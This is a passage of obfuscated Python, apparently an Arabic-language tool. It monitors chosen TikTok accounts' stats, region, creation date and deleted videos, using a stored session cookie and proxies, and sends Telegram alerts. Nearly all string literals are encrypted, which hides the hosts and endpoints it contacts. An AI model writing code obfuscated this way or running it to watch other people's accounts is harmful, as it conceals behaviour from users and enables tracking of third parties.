\xd8\xa7\xd8\xae\xd8\xaa\xd9\x8a\xd8\xa7\xd8\xb1_\xd9\x81\xd8\xad\xd8\xb5_\xd8\xa7\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa(username):\n    __sx__(b\'0XPMORjDq+i5L9I2y/OiLBodkpmILPRFTJHC+m1dN3A6ar27YaIhYUBIELisXORXwFqNUF5nauGvP8jPF1Z2cASgqrCn8QO4DcOdzzjIrgLYEo/s0dx4gIezYmZRIr1/GfH/UTfQa38P0GzybaR7u2c5OjN49IrLjtjL5N2DVgytus4WCoNs9xXDKC/JbKQnk8/WiOixFxWk7gZU6JmjIzg6b2vCd6LK5BlMGFMoHdBaYVgEOLKyjx6Uh82XQMBibuXxZzU4SIVO7lkA/lbtTnFrV9hiEXgw0Y00LsdmRpbfVE4OksCgVqu9+2n0\', 169)\n    while True:\n        print(f\'{MAG}\xd9\x87\xd9\x84 \xd8\xaa\xd8\xb1\xd9\x8a\xd8\xaf \xd9\x81\xd8\xad\xd8\xb5 \xd8\xa7\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa \xd9\x84\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8 @{username}\xd8\x9f{RESET}\')\n        print(f\'{CYAN}[1] \xd9\x86\xd8\xb9\xd9\x85 \xe2\x80\x94 \xd8\xa7\xd8\xa8\xd8\xaf\xd8\xa3 \xd8\xa7\xd9\x84\xd9\x81\xd8\xad\xd8\xb5 \xd9\x83\xd9\x84 {MONITOR_INTERVAL} \xd8\xab\xd8\xa7\xd9\x86\xd9\x8a\xd8\xa9{RESET}\')\n        print(f\'{YELLOW}[2] \xd9\x84\xd8\xa7 \xe2\x80\x94 \xd8\xaa\xd8\xa7\xd8\xa8\xd8\xb9 \xd8\xa8\xd8\xaf\xd9\x88\xd9\x86 \xd9\x81\xd8\xad\xd8\xb5{RESET}\')\n        choice = input(f\'{BLUE}\xd8\xa7\xd8\xae\xd8\xaa\xd8\xb1 (1/2): {RESET}\').strip()\n        _mirror(__sx__(b\'hSdGTAQ7b+Y2kkul1CGliE4MOzNmoMqm6X1xSMpL1305kssjEUdM49UnjE4AOw/mVpMxqs1JQCT7qSVXXVKdmYZOGDuP/QIQ15Q=\', 253))\n        if choice == __sx__(b\'4EKrnJiYqpiq\', 152):\n            DATA_DIR = __sx__(b\'uRuKjY8P7gzq6E+OiO2IxcHktsSb\', 193)\n            if not os.path.exists(DATA_DIR):\n                os.makedirs(DATA_DIR)\n            try:\n                video_file = os.path.join(DATA_DIR, f\'{username}.txt\')\n                if os.path.exists(video_file):\n                    os.remove(video_file)\n                DELTA_FLASH.pop(username, None)\n            except:\n                pass\n            return True\n        if choice == __sx__(b\'C6lAcXNzQHNA\', 115):\n            return False\n        print(f\'{RED}\xe2\x9d\x8c \xd8\xa7\xd8\xae\xd8\xaa\xd9\x8a\xd8\xa7\xd8\xb1 \xd8\xba\xd9\x8a\xd8\xb1 \xd8\xb5\xd8\xa7\xd9\x84\xd8\xad. \xd8\xa7\xd9\x84\xd8\xb1\xd8\xac\xd8\xa7\xd8\xa1 \xd8\xa5\xd8\xaf\xd8\xae\xd8\xa7\xd9\x84 1 \xd8\xa3\xd9\x88 2.{RESET}\')\n        _mirror(__sx__(b\'aMprJKdX8dbiC/t+vKrJFbQnOszIFXQQub0nhs98qaFGXxFcf6yhFjirQPHWwgv7kZqRUhqWGicGz/xAIMITEPmxOlw=\', 16))\nclear()\nprint(f\'{CYAN}{BOLD}\xe2\x9c\x85 \xd8\xaa\xd9\x85 \xd8\xb6\xd8\xa8\xd8\xb7 \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb9\xd8\xaf\xd8\xa7\xd8\xaf\xd8\xa7\xd8\xaa.{RESET}\')\n_mirror(__sx__(b\'w2HAjxzuWn0RIPvZYDaujA2QZ+PFCF59aaCA1BcECqc37FK6uyWBrDw=\', 187))\nif os.environ.get(__sx__(b\'0HKjoSGn3qWmXlxfW9ypqLGpqxE=\', 168)) or os.path.exists(__sx__(b\'3nyN6IuIaGppbep3jQ+Op6aAuqPG\', 166)):\n    print(f"{GREEN}\xe2\x80\xa2 SessionID: \xd8\xaa\xd9\x85 \xd8\xa7\xd9\x84\xd8\xaa\xd8\xad\xd9\x85\xd9\x8a\xd9\x84 \xd8\xaa\xd9\x84\xd9\x82\xd8\xa7\xd8\xa6\xd9\x8a\xd9\x8b\xd8\xa7 ({(\'env\' if os.environ.get(\'TT_SESSIONID\') else \'sessionid.txt\')}){RESET}")\n    _mirror(__sx__(b\'kzGQP1ujytNeU9PY1CQ4LqEKLUFwRuHcfTSHUloBLTFwRtxQhV1rL7GF3TazlYjyezCWiNLrO4H1ZQ==\', 235))\nelse:\n    print(f\'{YELLOW}\xe2\x80\xa2 SessionID \xd8\xba\xd9\x8a\xd8\xb1 \xd9\x85\xd8\xaa\xd9\x88\xd9\x81\xd8\xb1 \xe2\x80\x94 \xd8\xb3\xd9\x86\xd8\xaa\xd8\xac\xd8\xa7\xd9\x88\xd8\xb2 Mobile-signed \xd8\xaa\xd9\x84\xd9\x82\xd8\xa7\xd8\xa6\xd9\x8a\xd9\x8b\xd8\xa7 \xd9\x88\xd9\x86\xd8\xb3\xd8\xaa\xd8\xae\xd8\xaf\xd9\x85 \xd8\xa7\xd9\x84\xd9\x81\xd9\x88\xd9\x84\xd8\xa8\xd8\xa7\xd9\x83\xd8\xa7\xd8\xaa.{RESET}\')\nif not os.path.exists(__sx__(b\'WPprbG7uD+0LCa5vaQxpJCAFVyV6\', 32)):\n    os.makedirs(__sx__(b\'sROChYcH5gTi4EeGgOWAzcnsvsyT\', 201))\nload_extra_bot()\nconfigure_extra_bot_interactive()\nraw_input_users = input(f\'{MAG}\xd8\xa3\xd8\xaf\xd8\xae\xd9\x84 \xd9\x8a\xd9\x88\xd8\xb2\xd8\xb1/\xd9\x8a\xd9\x88\xd8\xb2\xd8\xb1\xd8\xa7\xd8\xaa (\xd9\x85\xd9\x81\xd8\xb5\xd9\x88\xd9\x84\xd8\xa9 \xd8\xa8\xd9\x81\xd9\x88\xd8\xa7\xd8\xb5\xd9\x84): {RESET}\').strip()\nusers = [u.strip() for u in raw_input_users.split(__sx__(b\'Xvz1JyYmCyYL\', 38)) if u.strip()]\nif not users:\n    print(f\'{RED}\xe2\x9d\x8c \xd9\x84\xd9\x85 \xd9\x8a\xd8\xaa\xd9\x85 \xd8\xa5\xd8\xaf\xd8\xae\xd8\xa7\xd9\x84 \xd8\xa3\xd9\x8a \xd9\x8a\xd9\x88\xd8\xb2\xd8\xb1{RESET}\')\n    _mirror(__sx__(b\'7U/uoSLSdPNeWMMQDsiiw5Q8jt76OSoke1NnDrifooNKeZefSnktJHxT05WRvIxQ\', 149))\n    raise SystemExit\nopen(__sx__(b\'81FAR0dYoCKjiouBcYlE\', 139), __sx__(b\'M5FgTEtLM0sz\', 75)).close()\nSUPPRESS_BASELINE_ALERTS = True\nfor g in users:\n    clear()\n    try:\n        info, bearer = fetch_userinfo_tikfans(g)\n        region_code, country_ar, flag, enriched = \xd8\xa7\xd8\xad\xd8\xb5\xd9\x84_\xd8\xb9\xd9\x84\xd9\x89_\xd8\xa8\xd9\x84\xd8\xaf_\xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8_\xd8\xad\xd9\x82\xd9\x8a\xd9\x82\xd9\x8a(g, info)\n        print(f"{BOLD}{CYAN}\xf0\x9f\x93\x8d \xd8\xa8\xd9\x84\xd8\xaf @{g}: {country_ar} {flag} \xe2\x80\x94 \xd9\x83\xd9\x88\xd8\xaf: {region_code or \'N/A\'}{RESET}")\n        _mirror(f"\xf0\x9f\x93\x8d \xd8\xa8\xd9\x84\xd8\xaf @{g}: {country_ar} {flag} \xe2\x80\x94 \xd9\x83\xd9\x88\xd8\xaf: {region_code or \'N/A\'}")\n        followers_val = int(info[__sx__(b\'uhiJCQ0LC+2N77AM7Q/pw8Lk0ce2\', 194)])\n        videos_val = int(info[__sx__(b\'6Eq7W9zZXedev127kZCGHpSx\', 144)])\n        likes_val = int(info[__sx__(b\'ErChIidGQBukRadBa2p8VW50\', 106)])\n        nickname = info[__sx__(b\'ErChoSakpCGmJ29qZLBpLQ==\', 106)]\n        bio = info[__sx__(b\'ROYX8nDzdxAVEXY5PC8iP+8=\', 60)]\n        account_created_ts, latest_video_ts = fetch_created_and_latest(g, sec_uid=info.get(__sx__(b\'sxHghYbFBofKy8O5yZU=\', 203), __sx__(b\'7kyVlpaWlpc=\', 150)))\n        account_created_str = _ts_to_str(account_created_ts)\n        latest_video_str = _ts_to_str(latest_video_ts)\n        if account_created_ts:\n            quick_cr = {__sx__(b\'BqRVV3h+fyN+lg==\', 126): int(account_created_ts), __sx__(b\'1HaHYoOB5uKprKWUrj4=\', 172): __sx__(b\'WvgJ6+4M7a/t7mnpJSI1TCYa\', 34), __sx__(b\'L40cmZgcnBsemhwZUldBK1NY\', 87): 95, __sx__(b\'vhwNDemP68DGwEbE7A==\', 198): __sx__(b\'XvxtCGxrCm8r7+prIyYwEiIi\', 38)}\n            _CREATION_CACHE[g] = quick_cr\n            _print_creation_line(g, quick_cr)\n        else:\n            creation_quick_line(g, info.get(__sx__(b\'Zcc2U1AT0FEcHRVvH0M=\', 29), __sx__(b\'owHY29vb29o=\', 219)))\n        threading.Thread(target=fetch_creation_background, args=(g, info.get(__sx__(b\'NZdmAwBDgAFMTUU/TxM=\', 77), __sx__(b\'40GYm5ubm5o=\', 155)), os.environ.get(__sx__(b\'YMITEZEXbhUW7uzv62wZGAEZG6E=\', 24)) or (open(__sx__(b\'A6FQNVZVtbe0sDeqUNJTentdZ34b\', 123), __sx__(b\'uxnowcPDsMOw\', 195), encoding=__sx__(b\'f90sKk7UsgcHAuUGsg==\', 7)).read().strip() if os.path.exists(__sx__(b\'c9EgRSYlxcfEwEfaIKIjCgstFw5r\', 11)) else __sx__(b\'Dqx1dnZ2dnc=\', 118))), daemon=True).start()\n        with open(__sx__(b\'ogARFhYJ8XPy29rQINgV\', 218), __sx__(b\'/13Mg4eH5Yfl\', 135), encoding=__sx__(b\'K4l4fhqA5lNTVrFS5g==\', 83)) as f_iin:\n            f_iin.write(f\'{g} | \xd9\x85\xd8\xaa\xd8\xa7\xd8\xa8\xd8\xb9\xd9\x8a\xd9\x86: {followers_val} | \xd8\xa5\xd8\xb9\xd8\xac\xd8\xa7\xd8\xa8\xd8\xa7\xd8\xaa: {likes_val} | \xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa: {videos_val}\\n\')\n        video_file_path = f\'accounts_data/{g}.txt\'\n        if os.path.exists(video_file_path):\n            try:\n                with open(video_file_path, __sx__(b\'91WkjY+P/I/8\', 143), encoding=__sx__(b\'1nSFg+d9G66uq0yvGw==\', 174)) as vf:\n                    old_video_count = int(vf.read().strip() or __sx__(b\'F7Vcb29vXm9e\', 111))\n            except:\n                old_video_count = videos_val\n        else:\n            old_video_count = videos_val\n        if not SUPPRESS_BASELINE_ALERTS:\n            if videos_val < old_video_count:\n                diff = videos_val - old_video_count\n                msg = f\'\xf0\x9f\x9a\xa8 \xd8\xad\xd8\xb0\xd9\x81 \xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa @{g}\\n\xf0\x9f\x93\x89 \xd8\xa7\xd9\x84\xd9\x81\xd8\xb1\xd9\x82: {diff}\\n\xf0\x9f\x8e\x9e\xef\xb8\x8f \xd8\xa7\xd9\x84\xd8\xb3\xd8\xa7\xd8\xa8\xd9\x82: {old_video_count}\\n\xf0\x9f\x8e\x9e\xef\xb8\x8f \xd8\xa7\xd9\x84\xd8\xad\xd8\xa7\xd9\x84\xd9\x8a: {videos_val}\\n\xf0\x9f\x94\x97 https://www.tiktok.com/@{g}\'\n                print(f\'{YELLOW}{msg}{RESET}\')\n                send_telegram_alert(msg)\n            elif videos_val > old_video_count:\n                diff = videos_val - old_video_count\n                print(f\'{YELLOW}\xe2\x9a\xa0\xef\xb8\x8f \xd8\xaa\xd9\x85 \xd8\xb1\xd9\x81\xd8\xb9 {diff} \xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88 \xd8\xac\xd8\xaf\xd9\x8a\xd8\xaf \xd9\x81\xd9\x8a \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8: @{g}{RESET}\')\n        with open(video_file_path, __sx__(b\'mjjJ5eLimuKa\', 226), encoding=__sx__(b\'qAr7/ZkDZdDQ1TLRZQ==\', 208)) as vf:\n            vf.write(str(videos_val))\n        analysis = \xd8\xaa\xd8\xad\xd9\x84\xd9\x8a\xd9\x84_\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8_\xd9\x85\xd8\xaa\xd9\x82\xd8\xaf\xd9\x85(followers_val, likes_val, videos_val, region_code, bio)\n        \xd8\xa7\xd8\xb7\xd8\xa8\xd8\xb9_\xd8\xa8\xd8\xb7\xd8\xa7\xd9\x82\xd8\xa9_\xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8(g, nickname, country_ar, flag, bio, followers_val, likes_val, videos_val, analysis, enriched=enriched)\n        print(f\'{WHITE}\xf0\x9f\x97\x93\xef\xb8\x8f \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1 \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8: {account_created_str}   \xe2\x8f\xb1\xef\xb8\x8f \xd8\xa3\xd8\xad\xd8\xaf\xd8\xab \xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88: {latest_video_str}{RESET}\')\n        _mirror(f\'\xf0\x9f\x97\x93\xef\xb8\x8f \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1 \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8: {account_created_str}   \xe2\x8f\xb1\xef\xb8\x8f \xd8\xa3\xd8\xad\xd8\xaf\xd8\xab \xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88: {latest_video_str}\')\n        save_log(f"{g} | {nickname} | {country_ar}({region_code}) | \xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa:{videos_val} | \xd9\x85\xd8\xaa\xd8\xa7\xd8\xa8\xd8\xb9\xd9\x8a\xd9\x86:{followers_val} | \xd8\xa5\xd8\xb9\xd8\xac\xd8\xa7\xd8\xa8\xd8\xa7\xd8\xaa:{likes_val} | \xd9\x82\xd9\x88\xd8\xa9:{analysis[\'final_score\']}% | \xd8\xaa\xd9\x81\xd8\xa7\xd8\xb9\xd9\x84:{analysis[\'engagement\']}% | \xd8\xb4\xd8\xa7\xd8\xb1\xd8\xa7\xd8\xaa:{\'|\'.join(analysis[\'badges\'])} | \xd8\xa8\xd8\xa7\xd9\x8a\xd9\x88:{bio}" + f\' | \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1:{account_created_str} | \xd8\xa3\xd8\xad\xd8\xaf\xd8\xab_\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88:{latest_video_str}\')\n        send_telegram_alert(f\'\xf0\x9f\x94\x97 \xd8\xb1\xd8\xa7\xd8\xa8\xd8\xb7 \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8: https://www.tiktok.com/@{g}\')\n        badges_text = __sx__(b\'+1nQ+1czy4KDhJKBxg==\', 131).join(analysis[__sx__(b\'UfNiY2VgZgQvKSEQK04=\', 41)])\n        summary = f"\xf0\x9f\x93\x84 \xd8\xaa\xd8\xad\xd9\x84\xd9\x8a\xd9\x84 @{g}\\n\xf0\x9f\x91\xa4 \xd8\xa7\xd9\x84\xd8\xa7\xd8\xb3\xd9\x85: {nickname or \'\xe2\x80\x94\'}\\n\xf0\x9f\x93\x8d \xd8\xa7\xd9\x84\xd8\xaf\xd9\x88\xd9\x84\xd8\xa9: {country_ar} {flag} ({region_code})\\n\xf0\x9f\x97\x93\xef\xb8\x8f \xd8\xa5\xd9\x86\xd8\xb4\xd8\xa7\xd8\xa1 \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8: {account_created_str}\\n\xe2\x8f\xb1\xef\xb8\x8f \xd8\xa3\xd8\xad\xd8\xaf\xd8\xab \xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88: {latest_video_str}\\n\xf0\x9f\x91\xa5 \xd8\xa7\xd9\x84\xd9\x85\xd8\xaa\xd8\xa7\xd8\xa8\xd8\xb9\xd9\x88\xd9\x86: {followers_val:,}\\n\xe2\x9d\xa4\xef\xb8\x8f \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb9\xd8\xac\xd8\xa7\xd8\xa8\xd8\xa7\xd8\xaa: {likes_val:,}\\n\xf0\x9f\x93\xb9 \xd8\xa7\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa: {videos_val:,}\\n\xf0\x9f\x93\x88 \xd8\xa7\xd9\x84\xd8\xaa\xd9\x81\xd8\xa7\xd8\xb9\xd9\x84: {analysis[\'engagement\']}%\\n\xf0\x9f\x93\x8a \xd8\xa7\xd9\x84\xd9\x82\xd9\x88\xd8\xa9: {analysis[\'final_score\']}% \xe2\x80\x94 {analysis[\'label\']}\\n\xf0\x9f\x94\x96 \xd8\xa7\xd9\x84\xd8\xb4\xd8\xa7\xd8\xb1\xd8\xa7\xd8\xaa: {badges_text}\\n\xf0\x9f\x94\x97 https://www.tiktok.com/@{g}"\n        send_telegram_alert(summary)\n        id_token = bearer\n        ur = info.get(__sx__(b\'0nCB5OekZ+arqqLYqPQ=\', 170), __sx__(b\'ctAJCgoKCgs=\', 10))\n        id = info.get(__sx__(b\'WvgJD2wP0G4jIirBIE8=\', 34), __sx__(b\'+1mAg4ODg4I=\', 131)) or info.get(__sx__(b\'5kRV0p+en6aeUA==\', 158), __sx__(b\'NpRNTk5OTk8=\', 78))\n        region = region_code\n        bio_val = bio\n        followers = str(followers_val)\n        videos = str(videos_val)\n        likes = str(likes_val)\n        res = json.dumps({__sx__(b\'6ki53N+cX96TkprgkMw=\', 146): ur, __sx__(b\'Hb9OSCtIlylkZW2GZwg=\', 101): id, __sx__(b\'8FJDQ8RGfsNExY2IhtKLrw==\', 136): nickname, __sx__(b\'SOoben3//P8zMDj+MrU=\', 48): region, __sx__(b\'91WkQcNAxKOmosWKj5yRjFw=\', 143): bio_val, __sx__(b\'2njp6W6JpKKmrKML\', 162): followers_val, __sx__(b\'bc8+3llc2BIVE0kXDQ==\', 21): videos_val, __sx__(b\'VPbnZGEABi0sKjAuOQ==\', 44): likes_val}, ensure_ascii=False)\n        r = json.dumps({__sx__(b\'LI5/HhmbmJtXVFyaVtE=\', 84): region, __sx__(b\'a8k43V/cWD86PlkWEwANEMA=\', 19): bio_val}, ensure_ascii=False)\n        stats = json.dumps({__sx__(b\'vhyNDQkPD+mJ67QI6Qvtx8bg1cOy\', 198): followers_val, __sx__(b\'6ki5Wd7bX+VcvV+5k5KEHJaz\', 146): videos_val, __sx__(b\'kjAhoqfGwJskxSfB6+r81e70\', 234): likes_val}, ensure_ascii=False)\n        if \xd8\xa7\xd8\xae\xd8\xaa\xd9\x8a\xd8\xa7\xd8\xb1_\xd9\x81\xd8\xad\xd8\xb5_\xd8\xa7\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa(g):\n            threading.Thread(target=\xd9\x81\xd8\xad\xd8\xb5_\xd9\x85\xd8\xb3\xd8\xaa\xd9\x85\xd8\xb1_\xd9\x84\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa, args=(g,), daemon=True).start()\n            print(f\'{GREEN}\xf0\x9f\x9a\x80 \xd8\xaa\xd9\x85 \xd8\xa8\xd8\xaf\xd8\xa1 \xd8\xa7\xd9\x84\xd9\x85\xd8\xb1\xd8\xa7\xd9\x82\xd8\xa8\xd8\xa9 \xd9\x83\xd9\x84 {MONITOR_INTERVAL} \xd8\xab\xd8\xa7\xd9\x86\xd9\x8a\xd8\xa9 \xd9\x84\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8 @{g}.{RESET}\')\n            _mirror(f\'\xf0\x9f\x9a\x80 \xd8\xaa\xd9\x85 \xd8\xa8\xd8\xaf\xd8\xa1 \xd8\xa7\xd9\x84\xd9\x85\xd8\xb1\xd8\xa7\xd9\x82\xd8\xa8\xd8\xa9 \xd9\x83\xd9\x84 {MONITOR_INTERVAL} \xd8\xab\xd8\xa7\xd9\x86\xd9\x8a\xd8\xa9 \xd9\x84\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8 @{g}.\')\n        else:\n            print(f\'{YELLOW}\xe2\x8f\xb8\xef\xb8\x8f \xd8\xaa\xd9\x85 \xd8\xaa\xd8\xac\xd8\xa7\xd9\x87\xd9\x84 \xd8\xa7\xd9\x84\xd9\x85\xd8\xb1\xd8\xa7\xd9\x82\xd8\xa8\xd8\xa9 \xd9\x84\xd9\x87\xd8\xb0\xd8\xa7 \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8.{RESET}\')\n            _mirror(f\'\xe2\x8f\xb8\xef\xb8\x8f \xd8\xaa\xd9\x85 \xd8\xaa\xd8\xac\xd8\xa7\xd9\x87\xd9\x84 \xd8\xa7\xd9\x84\xd9\x85\xd8\xb1\xd8\xa7\xd9\x82\xd8\xa8\xd8\xa9 \xd9\x84\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8 @{g}.\')\n    except Exception as e:\n        print(f\'{RED}\xe2\x9d\x8c \xd9\x81\xd8\xb4\xd9\x84 \xd9\x81\xd9\x8a \xd8\xaa\xd8\xad\xd9\x84\xd9\x8a\xd9\x84 \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8 {g}: {e}{RESET}\')\n        _mirror(f\'\xe2\x9d\x8c \xd9\x81\xd8\xb4\xd9\x84 \xd9\x81\xd9\x8a \xd8\xaa\xd8\xad\xd9\x84\xd9\x8a\xd9\x84 \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8 @{g}: {e}\')\n        continue\nprint(f\'{CYAN}\xe2\x9c\x85 \xd8\xa7\xd9\x86\xd8\xaa\xd9\x87\xd9\x89 \xd8\xa5\xd8\xaf\xd8\xae\xd8\xa7\xd9\x84 \xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8\xd8\xa7\xd8\xaa.{RESET}\')\nprint(f\'{WHITE}\xd9\x85\xd9\x84\xd8\xa7\xd8\xad\xd8\xb8\xd8\xa9: \xd8\xa5\xd9\x86 \xd9\x81\xd8\xb9\xd9\x91\xd9\x84\xd8\xaa \xd8\xa7\xd9\x84\xd9\x85\xd8\xb1\xd8\xa7\xd9\x82\xd8\xa8\xd8\xa9 \xd9\x84\xd8\xa3\xd9\x8a \xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8\xd8\x8c \xd8\xa7\xd8\xaa\xd8\xb1\xd9\x83 \xd8\xa7\xd9\x84\xd8\xa8\xd8\xb1\xd9\x86\xd8\xa7\xd9\x85\xd8\xac \xd9\x85\xd9\x81\xd8\xaa\xd9\x88\xd8\xad\xd9\x8b\xd8\xa7 \xd9\x84\xd9\x8a\xd8\xb3\xd8\xaa\xd9\x85\xd8\xb1 \xd8\xa7\xd9\x84\xd9\x81\xd8\xad\xd8\xb5.{RESET}\')\n_mirror(__sx__(b\'giDfcUH3esrqua0z/iNrtfhycGTs377+7qtLcyfI8/xwaddFjQ0W9vjH6MH0/PH0FuAgjZdri9jaEGjvXs1WiovosGW7fVhWH1bVaXI4HAV0UKQ3m8mOWHPHyL3+AfoBhqpw\', 250))\nclear()\nuid1 = []\nprint(f\'{Z}[{F}1{Z}] {C1}\xd8\xa3\xd8\xa8\xd8\xaf\xd8\xa1 \')\naobsh = __sx__(b\'0HKbrKiomqia\', 168)\nclear()\nimport time\nif aobsh == __sx__(b\'HrxVYmZmVGZU\', 102):\n    try:\n        h3 = {__sx__(b\'/lytq8irVMvKyUuth4aTfYV6\', 134): __sx__(b\'YMLr1bfS1NFRzC/NK0jIENfUU9E3N07oE0koLMgrqE4YEoCBQDNMgIFwMiAODPy8nr8+YX+O8IMCg/MBgzFwYGOc4OLwMPx8fr8yoL8+f/9zMiB/DP3/vvIDAkDyAZi4Wmh6QnpJPkwTGDhzB7Q=\', 24)}\n        ttwid = requests.head(__sx__(b\'+1lIq6qqqzVRVKysrFSoSk+tSkxVyE1MVoSD61KLEg==\', 131), headers=h3).cookies.get_dict()[__sx__(b\'CKpbWVm/PHFwdsRyXQ==\', 112)]\n    except requests.exceptions.ConnectionError:\n        print(__sx__(b\'1HaxJmWhbIy8r/d18r+k5o+HDbBO5YtPwk5cXfTPR8jcPe3GC5ebcvz98eo5ssaIf9Y1bsGaG2+TKk1VVWerTpefPw==\', 172))\n        exit()\n    except:\n        print(__sx__(b\'QeOC4Exa2rQMDq8S5WFHitxf0rSMeYM68VNuOUsPO5Ai8laVOgg5dpUi2A==\', 57))\n        exit()\nuid1 = []\nprint(f\'{Z}[{F}1{Z}] {C1}\xd8\xa3\xd8\xa8\xd8\xaf\xd8\xa1 \xd9\x81\xd9\x8a \xd8\xa7\xd9\x84\xd8\xa8\xd9\x84\xd8\xa7\xd8\xba\')\naobsh = __sx__(b\'JoRtWl5ebF5s\', 94)\nclear()\nimport time\nif aobsh == __sx__(b\'9Fa/iIyMvoy+\', 140):\n    try:\n        h3 = {__sx__(b\'O5lobg1ukQ4PDI5oQkNWuEC/\', 67): __sx__(b\'FLafocOmoKUluFu5Xzy8ZKOgJ6VDQzqcZz1cWLxf3DpsZvT1NEc49PUERlR6eIjI6stKFQv6hPd294d190UEFBfolJaERIgICstG1MtKC4sHRlQLeImLyoZ3djSGdezMLhwONg49SjhnbEwHc8A=\', 108)}\n        ttwid = requests.head(__sx__(b\'LI6ffH19fOKGg3t7e4N/nZh6nZuCH5qbgVNUPIVcxQ==\', 84), headers=h3).cookies.get_dict()[__sx__(b\'ErBBQ0OlJmtqbN5oRw==\', 106)]\n    except requests.exceptions.ConnectionError:\n        print(__sx__(b\'giDncDP3Otrq+aEjpOnysNnRW+YYs90ZlBgKC6KZEZ6Ka7uQXcHNJKqrp7xv5JDeKYBjOJfMTTnFfBsDAzH9GMHJaQ==\', 250))\n        exit()\n    except:\n        print(__sx__(b\'VvSV91tNzaMbGbgF8nZQnctIxaObbpQt5kR5LlwYLIc15UGCLR8uYYI1zw==\', 46))\n        exit()\nimport threading\nimport time\nimport os\nimport random\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nls = [__sx__(b\'qgjh55jgm2Ge4+Xn5+Hn5uHhmGGamGOY4OTm5Z2b5mHi5WHiZ57jpJr9BZmb/pseHv/6H/ucB5kcHWdg4uDU0iqvw2Y=\', 210), __sx__(b\'2HqTleqS6RPskZeVlZOVlJOT6hPo6hHqkpaUl+/plBOQlxOQFeyR1uiPd+vpjOlsbI2IbYnudetubxUSkJKmoFjdsRQ=\', 160), __sx__(b\'4UOqrNOr0CrVqK6srKqsraqq0yrR0yjTq6+trtbQrSqpriqpLNWo79G2TtLQtdBVVbSxVLDXTNJXViwrqaufmWHkiC0=\', 153)]\nfile = __sx__(b\'O5mICG9tcZdo6mtCQ1JuQDc=\', 67)\n\ndef read_file():\n    __sx__(b\'OphnjoNLwnJWQZIXvEas6vQQqItTBuZoIGvc+AvwzxMto2dGaUgMZhYB4IHEgIJcdeGyutJcF37zhyyKsAnq3OFz6om2vfKRG4DuW39FgYC6ZIX0O0JkzASg\', 66)\n    return ls\n\ndef _normalize_proxy(line: str, default_scheme: str=__sx__(b\'nT8uzczM5eXhveQk\', 229)) -> str:\n    s = line.strip()\n    if s.startswith((__sx__(b\'60lYu7q6I0FElJOZRZHK\', 147), __sx__(b\'03Fgg4KCgx15fKyrpcipZw==\', 171), __sx__(b\'AaNStza3V0/Mq65+eWhoe4g=\', 121), __sx__(b\'w2GQdfR1lY0KaWy8u6q2uUs=\', 187))):\n        return s\n    s = s.replace(__sx__(b\'NZceTU1NbE1s\', 77), __sx__(b\'gSP6+fn5+fg=\', 249))\n    if __sx__(b\'dNZ/DAwMTQxN\', 12) in s and s.count(__sx__(b\'hSdO//39xv3G\', 253)) >= 2:\n        return f\'{default_scheme}://{s}\'\n    parts = s.split(__sx__(b\'23kQoaOjmKOY\', 163))\n    if len(parts) == 2 and parts[1].isdigit():\n        host, port = parts\n        return f\'{default_scheme}://{host}:{port}\'\n    if len(parts) == 4 and parts[3].isdigit():\n        user, pwd, host, port = parts\n        return f\'{default_scheme}://{user}:{pwd}@{host}:{port}\'\n    if len(parts) == 4 and parts[1].isdigit():\n        host, port, user, pwd = parts\n        return f\'{default_scheme}://{user}:{pwd}@{host}:{port}\'\n    return f\'{default_scheme}://{s}\'\n\ndef _to_requests_proxies(proxy_url: str) -> dict:\n    